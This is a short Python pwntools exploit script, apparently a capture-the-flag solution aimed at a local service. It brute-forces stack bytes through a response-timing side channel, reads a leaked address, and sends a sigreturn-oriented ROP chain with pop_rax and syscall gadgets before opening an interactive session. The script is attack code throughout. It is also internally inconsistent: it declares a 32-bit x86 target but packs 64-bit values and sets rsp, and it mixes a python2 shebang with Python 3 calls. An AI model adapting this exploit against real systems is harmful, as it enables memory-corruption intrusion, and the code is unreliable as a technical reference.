#!/usr/bin/env python2

import os
import re
import sys
import time

from pwn import *

context.arch = "x86"
context.log_level ='error'
context.bits = 32
context.os = "linux"


host = 'localhost'
port = 28095

base_payload = b'/flag\x00'+ b'A'*34+ b'\x00'

for i in range(0, 7):
    bestTime = 0
    bestValue = -1
    for j in range(0, 256):
       p = remote(host, port)
       payload = base_payload + j.to_bytes(1, 'little')
       sendTime = time.time()
       p.send(payload)
       p.recvuntil(b"feedback\n")
       timeDiff = time.time() - sendTime
       if(timeDiff > bestTime):
           bestTime = timeDiff
           bestValue = j
       p.close()
    base_payload += bestValue.to_bytes(1, 'little')

print(base_payload)

p = remote(host, port)
p.recvuntil(b'Hint:')
buffer_address = int(p.recvline()[-11:-1], 16)
print(hex(buffer_address))

write_address = 0x8049100
pop_rax = 0x40152e
syscall = 0x40152b

frame1 = SigreturnFrame()
frame1.rsp = 0xdeadbeef

payload  = base_payload + b'A'*24
payload += p64(pop_rax)
payload += p64(0xf)
payload += p64(syscall)
payload += bytes(frame1)

p = remote(host, port)
p.send(payload)
print(p.recvall())
p.interactive()
